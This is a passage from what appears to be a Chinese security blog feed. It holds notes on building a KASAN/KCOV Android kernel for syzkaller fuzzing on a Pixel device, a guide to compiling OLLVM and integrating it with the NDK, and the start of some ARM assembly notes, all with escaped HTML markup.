&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;cover&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;vm&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;devices&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="err">$DEVICES&lt;/span>&lt;span class="p">],&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;battery_check&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>
&lt;p>KASAN+KCOV编译内核&lt;/p>
&lt;ol>
&lt;li>
&lt;p>首先编译要fuzz的Android版本输入手机。（过程省略）[1]&lt;/p>
&lt;/li>
&lt;li>
&lt;p>下载编译基准内核。[2] ，使用手动编译会报错，使用给KASCAN文档[3]的方法也可能报错。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 创建文件夹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir android-kernel &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nb">cd&lt;/span> android-kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 切换分支&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">repo init -u https://android.googlesource.com/kernel/manifest -b BRANCH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">repo sync
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 修改内核build文件 内核路径下的build.config制定make_deconfig&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">KERNEL_DIR&lt;/span>&lt;span class="o">=&lt;/span>private/msm-google
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. &lt;span class="si">${&lt;/span>&lt;span class="nv">ROOT_DIR&lt;/span>&lt;span class="si">}&lt;/span>/&lt;span class="si">${&lt;/span>&lt;span class="nv">KERNEL_DIR&lt;/span>&lt;span class="si">}&lt;/span>/build.config.common &lt;span class="c1">##这里&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 构建内核&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">build/build.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>刷入内核&lt;/p>
&lt;p>重新编译aosp启动镜像&lt;/p>
&lt;p>在服务器上编译的将out/dist目录打包备份&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="o">{&lt;/span>aosp_dir&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp &lt;span class="o">{&lt;/span>kernel_dir&lt;span class="o">}&lt;/span>/out/&lt;span class="o">{&lt;/span>version&lt;span class="o">}&lt;/span>/dist/Image.lz4-dtb &lt;span class="o">{&lt;/span>aosp&lt;span class="o">}&lt;/span>/device/google/marlin-kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">. build/envsetup.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lunch aosp_sailfish-userdebug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make -j64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 重新拷贝到本地 win&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adb reboot bootloader
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> &lt;span class="nv">ANDROID_PRODUCT_OUT&lt;/span>&lt;span class="o">=&lt;/span>./
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fastboot flashall -w
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>之前 3.18.137-g72a7a6&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> 之后 … (手机显示无法显示内核)
```shell
sailfish:/ # uname -a
Linux localhost 3.18.137-g8b62de70252d #1 SMP PREEMPT 2019-09-27 02:13:04 aarch64
```
&lt;/code>&lt;/pre>
&lt;/li>
&lt;li>
&lt;p>修改内核重新刷入&lt;/p>
&lt;ul>
&lt;li>失败的方法&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>按文档说的&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> ```shell
cd arch/arm64/configs
cp marlin_defconfig marlin-kasan_defconfig
```
在配置文档中移除`CONFIG_KERNEL_LZ4=y`
加入
```plain text
CONFIG_KASAN_INLINE=y
CONFIG_KCOV=y
CONFIG_SLUB=y
CONFIG_SLUB_DEBUG=y
```
重新编译内核。
发现任何变化
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>尝试的方法&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> 修改build.config文件
```shell
. ${ROOT_DIR}/${KERNEL_DIR}/build.config.kasan (失败)
```
不修改，还是去修改marlin_defconfig添加KASAN
报错：savedefconfig does not match private/msm-google
修改build.config 删掉check_defconfig 检查 （失败）
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>不修改文件&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code> 使用命令
```shell
./build/build.sh BUILD_CONFIG=build.config.kasan
```
&lt;/code>&lt;/pre>
&lt;p>最后发现&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cp private/msm-google/build.config.kasan ./
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">BUILD_CONFIG&lt;/span>&lt;span class="o">=&lt;/span>build.config.kasan build/build.sh &lt;span class="c1">##放前面才管用&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>编译完成 ，修改aosp参数&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">aosp$ &lt;span class="nb">cd&lt;/span> device/google/marlin/sailfish
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp BoardConfig.mk BoardConfig.mk.bak
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vim BoardConfig.mk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## 注释掉&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_BASE :&lt;span class="o">=&lt;/span> 0x80000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_PAGESIZE :&lt;span class="o">=&lt;/span> &lt;span class="m">4096&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## ifneq ($(filter sailfish_kasan, $(TARGET_PRODUCT)),)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_OFFSET :&lt;span class="o">=&lt;/span> 0x80000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_KERNEL_TAGS_OFFSET :&lt;span class="o">=&lt;/span> 0x02500000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_RAMDISK_OFFSET :&lt;span class="o">=&lt;/span> 0x02700000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BOARD_MKBOOTIMG_ARGS :&lt;span class="o">=&lt;/span> --kernel_offset &lt;span class="k">$(&lt;/span>BOARD_KERNEL_OFFSET&lt;span class="k">)&lt;/span> --ramdisk_offset &lt;span class="k">$(&lt;/span>BOARD_RAMDISK_OFFSET&lt;span class="k">)&lt;/span> --tags_offset &lt;span class="k">$(&lt;/span>BOARD_KERNEL_TAGS_OFFSET&lt;span class="k">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## BOARD_KERNEL_TAGS_OFFSET := 0x02000000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## BOARD_RAMDISK_OFFSET := 0x02200000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## endif&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TARGET_KERNEL_ARCH :&lt;span class="o">=&lt;/span> arm64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TARGET_KERNEL_HEADER_ARCH :&lt;span class="o">=&lt;/span> arm64
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>修改device/google/marlin/device-common.mk&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">lz4-&amp;gt;gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LOCAL_KERNEL :&lt;span class="o">=&lt;/span> device/google/marlin-kernel/Image.gz-dtb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>新的问题&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">error: out/target/product/sailfish/boot-debug.img too large
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>解决方法：将BoardConfig.mk的&lt;code>BOARD_BOOTIMAGE_PARTITION_SIZE&lt;/code>的值改大。&lt;/p>
&lt;p>重新编译aosp启动镜像 再刷入手机。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-开启fuzzing">0x03 开启fuzzing&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">./bin/syz-manager -config&lt;span class="o">=&lt;/span>android.cfg
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200916163028.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>fuzz&lt;/p>
&lt;p>手机不断重启。。。。&lt;/p>
&lt;p>查看msg:&lt;code>adb shell dmesg -w&lt;/code>&lt;/p>
&lt;p>&lt;code>syz-manager -debug&lt;/code> 查看syz的相关问题。&lt;/p>
&lt;h3 id="参考">参考&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>[1]https://source.android.google.cn/setup/build?hl=zh-cn&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[2]https://source.android.google.cn/setup/build/building-kernels?hl=zh-cn&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[3]https://source.android.com/devices/tech/debug/kasan-kcov&lt;/p>
&lt;/li>
&lt;li>
&lt;p>[4]https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_android-device_arm-kernel.md&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>OLLVM_混淆之一（补</title><link>https://ykiko.top/p/ollvm_%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80%E8%A1%A5/</link><pubDate>Tue, 10 Sep 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ollvm_%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80%E8%A1%A5/</guid><description>&lt;h1 id="ollvm_混淆之一补">OLLVM_混淆之一（补&lt;/h1>
&lt;h3 id="ollvm">OLLVM&lt;/h3>
&lt;p>OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个针对LLVM代码混淆项目， 用于增加逆向难度，保护代码的安全。最新版本为&lt;a class="link" href="https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0" target="_blank" rel="noopener"
>4.0&lt;/a>。OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="http://llvm.org/" target="_blank" rel="noopener"
>LLVM&lt;/a>是lowlevel virtual machine的简称，是一个编译器框架。详细介绍可以看&lt;a class="link" href="https://zh.wikipedia.org/wiki/LLVM" target="_blank" rel="noopener"
>WIKI-LLVM&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180823112535.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>经典的三段式设计，前端使用不同的编译工具对代码进行分析转换成LLVM的中间表示IR（intermediate representation）。中间部分优化器只对IR进行操作，通过一系列的Pass对IR做优化。后端主要是讲优化好的IR解释成对应的机器码。&lt;/p>
&lt;p>对IR的处理过程下图：&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180823113111.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>IR Pass&lt;/p>
&lt;p>OLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。&lt;/p>
&lt;h3 id="ollvm-android环境搭建">OLLVM-Android环境搭建&lt;/h3>
&lt;p>前提环境：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>NDK环境&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LLVM&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">$&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">git&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">clone&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">llvm&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">4&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="na">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//github.com/obfuscator-llvm/obfuscator.git&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">$&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mkdir&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">build&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">$&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cd&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">build&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">$&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cmake&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">DCMAKE_BUILD_TYPE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Release&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">obfuscator&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">//（cmake -G &amp;#34;MinGW Makefiles&amp;#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">$&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">make&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">j7&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">//这个数字自己看自己CPU填 太小可能非常编译慢&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以参照&lt;a class="link" href="https://github.com/obfuscator-llvm/obfuscator/wiki" target="_blank" rel="noopener"
>官方wiki&lt;/a>来操作。编译完成后，二进制文件放在build/bin目录下。&lt;/p>
&lt;p>配置整合NDK：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>将&lt;code>\build\bin&lt;/code>目录下的&lt;code>clang.exe&lt;/code>、&lt;code>clang++.exe&lt;/code>和&lt;code>clang-format.exe&lt;/code>复制到&lt;code>\toolchains\llvm\prebuilt\windows-x86_64\bin&lt;/code>目录下，直接替换掉其中的文件。（Windows下）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>（linux下)将llvm目录下的prebuilt目录和文件 config.mk、setup.mk和setup-common.mk拷贝到创建的obfuscator-llvm目录下-&amp;gt;然后替换obfuscator-llvm/prebuilt/linux-x86下的bin和lib为我们编译好的bin和lib&lt;/p>
&lt;/li>
&lt;li>
&lt;p>然后将下面文件复制一份，改名称如下，比如arm-linux-androideabi-clang3.4复制一行改名为arm-linux-androideabi-obfuscator3.4&lt;/p>
&lt;p>arm-linux-androideabi-clang3.4-&amp;gt; arm-linux-androideabi-obfuscator3.4&lt;/p>
&lt;p>mipsel-linux-android-clang3.4-&amp;gt; mipsel-linux-android-obfuscator3.4&lt;/p>
&lt;p>x86-clang3.4-&amp;gt; x86-obfuscator3.4&lt;/p>
&lt;/li>
&lt;li>
&lt;p>分别修改以上三个文件的 setup.mk 中的 LLVM_NAME ，即将其指定到开始建立的obfuscator-llvm-3.4目录，也就是把把&lt;code>LLVM_NAME := llvm-$(LLVM_VERSION)改成LLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果是配置64位的ndk配置,还要额外修改$NDK_PATH/build/core/setup-toolchain.mk文件，在NDK_64BIT_TOOLCHAIN_LIST := 加入 obfuscator 对应的NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9’&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="开始使用ollvm">开始使用OLLVM&lt;/h3>
&lt;h3 id="参考">参考&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="http://www.freebuf.com/articles/terminal/130142.html" target="_blank" rel="noopener"
>http://www.freebuf.com/articles/terminal/130142.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/" target="_blank" rel="noopener"
>https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.jmpoep.com/thread-4016-1-1.html" target="_blank" rel="noopener"
>https://www.jmpoep.com/thread-4016-1-1.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>BCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>ARM汇编基础(待补充)</title><link>https://ykiko.top/p/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Sat, 10 Aug 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="arm汇编基础待补充">ARM汇编基础(待补充)&lt;/h1>
&lt;h2 id="arm汇编基础简">ARM汇编基础(简)&lt;/h2>
&lt;p>经常忘记，做个笔记，好作复习。。&lt;/p>
&lt;p>内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 &lt;a class="link" href="https://www.anquanke.com/post/id/86383" target="_blank" rel="noopener"
>ARM 汇编&lt;/a> 和&lt;a class="link" href="https://azeria-labs.com/writing-arm-assembly-part-1/" target="_blank" rel="noopener"
>Azeria-labs&lt;/a>&lt;/p>
&lt;h3 id="arm架构">ARM架构&lt;/h3>
&lt;p>ARM属于RISC CPU，&lt;/p>
&lt;ul>
&lt;li>
&lt;p>ARM模式 4个字节opcode 32位&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Thumb模式 2个字节opcode 16位&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Thumb-2模式 同上（只是有部分4个字节的opcode)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>64位ARM 4个字节opcode&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810112415.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="数据类型">数据类型&lt;/h3>
&lt;p>数据类型在汇编语言中的扩展后缀为**-h&lt;strong>或者&lt;/strong>-sh&lt;strong>对应着半字，&lt;/strong>-b&lt;strong>或者&lt;/strong>-sb**对应着字节，但是对于字并没有对应的扩展&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810113108.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">ldr = 加载字，宽度四字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrh = 加载无符号的半字，宽度两字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrsh = 加载有符号的半字，宽度两字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrb = 加载无符号的字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ldrsb = 加载有符号的字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">str = 存储字，宽度四字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strh = 存储无符号的半字，宽度两字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strsh = 存储有符号的半字，宽度两字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strb = 存储无符号的字节
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strsb = 存储有符号的字节
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="字节序">字节序&lt;/h3>
